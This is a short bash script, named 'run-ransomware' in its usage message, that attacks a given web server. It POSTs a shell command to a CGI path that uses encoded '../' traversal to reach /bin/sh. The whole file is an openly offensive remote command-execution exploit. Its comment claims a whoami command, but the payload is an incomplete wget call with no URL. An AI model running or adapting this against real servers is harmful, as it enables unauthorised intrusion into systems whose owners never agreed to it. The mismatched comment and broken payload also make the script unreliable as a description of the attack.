#!/usr/bin/env bash
if [[ -z $1 ]]; then
  echo "usage: ./run-ransomware <target>"
  exit 1;
fi;

# first arg is the target
TARGET=$1

# curl target with whoami command
curl -X POST --data 'echo;wget -q -O - ' $TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh 
